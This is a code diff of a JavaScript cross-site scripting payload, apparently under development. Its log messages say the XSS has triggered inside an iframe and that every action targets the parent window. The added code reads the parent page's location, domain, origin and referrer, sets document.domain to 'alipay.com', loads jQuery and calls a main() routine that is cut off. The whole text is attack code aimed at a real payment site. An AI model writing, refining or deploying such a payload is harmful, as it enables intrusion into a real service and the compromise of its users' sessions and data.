@@ -5,12 +5,26 @@
     
     // 日志函数 - 输出到父窗口
     function addLog(message, type) {
+        // 先输出到控制台，确保能看到
+        console.log('[' + (type || 'info') + '] ' + message);
+        
         try {
+            // 确保能访问父窗口
+            if (!parentDoc || !parentWin) {
+                console.warn('无法访问父窗口，跳过日志输出');
+                return;
+            }
+            
             var logContainer = parentDoc.getElementById('logContainer');
             if (!logContainer) {
                 // 如果日志容器不存在，先创建UI
-                initParentUI();
-                logContainer = parentDoc.getElementById('logContainer');
+                try {
+                    initParentUI();
+                    logContainer = parentDoc.getElementById('logContainer');
+                } catch(e) {
+                    console.error('initParentUI 在 addLog 中失败:', e);
+                    return;
+                }
             }
             
             if (logContainer) {
@@ -21,11 +35,13 @@
                 logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
                 logContainer.appendChild(logEntry);
                 logContainer.scrollTop = logContainer.scrollHeight;
+            } else {
+                console.warn('logContainer 不存在，无法添加日志');
             }
         } catch(e) {
             console.error('添加日志失败:', e);
+            console.error('错误堆栈:', e.stack);
         }
-        console.log('[' + type + '] ' + message);
     }
     
     // 初始化父窗口UI
@@ -215,53 +231,131 @@
     }
     
     // 初始化
-    addLog('🚀 XSS触发，开始执行...', 'info');
-    addLog('📍 当前在iframe中，所有操作将作用到父窗口', 'info');
-    
-    // 初始化父窗口UI
-    initParentUI();
-    
-    // 显示环境信息
-    setTimeout(function() {
+    try {
+        addLog('🚀 XSS触发，开始执行...', 'info');
+        addLog('📍 当前在iframe中，所有操作将作用到父窗口', 'info');
+        
+        // 初始化父窗口UI
         try {
-            var winLocation = parentWin.location.href;
-            var docDomain = parentDoc.domain || 'N/A';
-            var origin = parentWin.location.origin || 'N/A';
-            var referer = parentDoc.referrer || 'N/A';
+            initParentUI();
+            addLog('✅ initParentUI 执行完成', 'success');
+        } catch(e) {
+            console.error('initParentUI 失败:', e);
+            addLog('❌ initParentUI 失败: ' + e.message, 'error');
+        }
+        
+        // 显示环境信息 - 使用更长的延迟确保UI已完全创建
+        setTimeout(function() {
+            try {
+                addLog('⏳ setTimeout 开始执行...', 'info');
+                addLog('⏳ 开始获取环境信息...', 'info');
             
-            addLog('当前执行环境检测:', 'info');
+            var winLocation = 'N/A';
+            var docDomain = 'N/A';
+            var origin = 'N/A';
+            var referer = 'N/A';
+            
+            try {
+                winLocation = parentWin.location.href;
+                addLog('✅ 获取 window.location 成功', 'success');
+            } catch(e) {
+                addLog('❌ 获取 window.location 失败: ' + e.message, 'error');
+                winLocation = '无法访问 (跨域限制)';
+            }
+            
+            try {
+                docDomain = parentDoc.domain || 'N/A';
+                addLog('✅ 获取 document.domain 成功: ' + docDomain, 'success');
+            } catch(e) {
+                addLog('❌ 获取 document.domain 失败: ' + e.message, 'error');
+            }
+            
+            try {
+                origin = parentWin.location.origin || 'N/A';
+                addLog('✅ 获取 window.origin 成功: ' + origin, 'success');
+            } catch(e) {
+                addLog('❌ 获取 window.origin 失败: ' + e.message, 'error');
+                origin = '无法访问 (跨域限制)';
+            }
+            
+            try {
+                referer = parentDoc.referrer || 'N/A';
+                addLog('✅ 获取 document.referrer 成功: ' + referer, 'success');
+            } catch(e) {
+                addLog('❌ 获取 document.referrer 失败: ' + e.message, 'error');
+            }
+            
+            addLog('当前执行环境检测完成:', 'info');
             addLog('  - window.location: ' + winLocation, 'info');
             addLog('  - document.domain: ' + docDomain, 'info');
             addLog('  - window.origin: ' + origin, 'info');
             addLog('  - document.referrer: ' + referer, 'info');
             
-            var winLocationEl = parentDoc.getElementById('winLocation');
-            var docDomainEl = parentDoc.getElementById('docDomain');
-            var originEl = parentDoc.getElementById('origin');
-            var refererEl = parentDoc.getElementById('referer');
-            if (winLocationEl) winLocationEl.textContent = winLocation;
-            if (docDomainEl) docDomainEl.textContent = docDomain;
-            if (originEl) originEl.textContent = origin;
-            if (refererEl) refererEl.textContent = referer;
+            try {
+                var winLocationEl = parentDoc.getElementById('winLocation');
+                var docDomainEl = parentDoc.getElementById('docDomain');
+                var originEl = parentDoc.getElementById('origin');
+                var refererEl = parentDoc.getElementById('referer');
+                if (winLocationEl) winLocationEl.textContent = winLocation;
+                if (docDomainEl) docDomainEl.textContent = docDomain;
+                if (originEl) originEl.textContent = origin;
+                if (refererEl) refererEl.textContent = referer;
+                addLog('✅ 环境信息已更新到页面', 'success');
+            } catch(e) {
+                addLog('❌ 更新环境信息到页面失败: ' + e.message, 'error');
+            }
             
             // 设置document.domain（如果需要）
             try {
                 parentDoc.domain = 'alipay.com';
-                addLog('document.domain 已设置为: alipay.com', 'success');
+                addLog('✅ document.domain 已设置为: alipay.com', 'success');
             } catch(e) {
-                addLog('设置 document.domain 失败: ' + e.message, 'warning');
+                addLog('⚠️ 设置 document.domain 失败: ' + e.message, 'warning');
             }
-        } catch(e) {
-            addLog('获取环境信息失败: ' + e.message, 'error');
+            
+            addLog('⏳ 开始加载jQuery...', 'info');
+            
+            // 加载jQuery并开始执行
+            loadjQuery(function() {
+                addLog('✅ jQuery加载完成，准备执行主流程', 'success');
+                setTimeout(function() {
+                    try {
+                        addLog('⏳ 开始执行主流程...', 'info');
+                        main();
+                    } catch(e) {
+                        addLog('❌ main() 执行失败: ' + e.message, 'error');
+                        console.error('main() 错误:', e);
+                    }
+                }, 500);
+            });
+            } catch(e) {
+                addLog('❌ setTimeout 内部执行失败: ' + e.message, 'error');
+                console.error('setTimeout 错误:', e);
+                // 即使出错也尝试继续
+                try {
+                    loadjQuery(function() {
+                        setTimeout(function() {
+                            try {
+                                main();
+                            } catch(e2) {
+                                console.error('main() 错误:', e2);
+                            }
+                        }, 500);
+                    });
+                } catch(e3) {
+                    console.error('loadjQuery 错误:', e3);
+                }
+            }
+        }, 100);
+    } catch(e) {
+        console.error('初始化失败:', e);
+        try {
+            addLog('❌ 初始化过程出错: ' + e.message, 'error');
+            addLog('错误堆栈: ' + (e.stack ? e.stack.substring(0, 300) : 'N/A'), 'error');
+        } catch(e2) {
+            console.error('无法添加错误日志:', e2);
         }
-        
-        // 加载jQuery并开始执行
-        loadjQuery(function() {
-            setTimeout(function() {
-                main();
-            }, 500);
-        });
-    }, 100);
+    }
     
     // 主函数
     function main() {
